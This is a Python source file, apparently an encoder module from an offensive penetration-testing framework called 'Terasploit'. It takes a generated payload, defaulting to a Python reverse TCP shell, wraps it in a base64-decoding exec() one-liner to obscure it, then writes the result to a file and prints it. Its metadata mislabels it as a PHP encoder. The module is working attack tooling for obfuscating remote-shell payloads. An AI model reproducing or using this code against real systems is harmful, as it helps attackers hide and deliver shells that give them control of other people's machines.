#######
# Module/Encoder: Python Base64 Encoder
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.encoder import *

class TerasploitModule(Encoder):
    
    def initialize(self,info_only: bool = False) -> None:
        update_info(
            {
                'License'     : 'Terasploit Framework License (BSD)',
                'Name'        : 'PHP Base64 Encoder',
                'Module'      : Module.encoder,
                'Arch'        : Arch.PYTHON,
                'Platform'    : Platform.PYTHON,
                'Payload'     : 'modules/payload/python/shell_reverse_tcp',
                'Author'      : [
                    'Charlie <rupture6.dev[at]gmail.com>'
                ],
                'Description' : [
                    'PHP Base64 Encoder'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('encoder',reset=True)


    def encode(self,payload,arch):
        if arch.lower() != Arch.PYTHON:
            info_print ('Failed to encode, invalid encoder.')
            return False

        encode = str(b64encode(bytes(payload, "utf-8")), "utf-8")

        return (
            "exec(__import__('base64').b64decode('{}'))".format(
                encode
            )
        ), True


    def run(self) -> tuple[str, bool]: 
        payload = Get.payload()[0].generate()
        payload_arch = module_info.payload_info['Arch']
        shell_name = module_info.payload_info['PayloadHandler']

        info_print ('Encoding shell...')
        encoded_shell = self.encode(payload,payload_arch)
        if not encoded_shell:
            return 'done', True
        
        info_print ('Done encoding shell in base64, generating file...')
        shell, boolean = encoded_shell
        if boolean == True:
            self.generate_file(shell_name,payload_arch,shell)
            for i in ['----',shell,'----']:
                print (i)
            return 'done', True
        if boolean == False:
            return 'done', True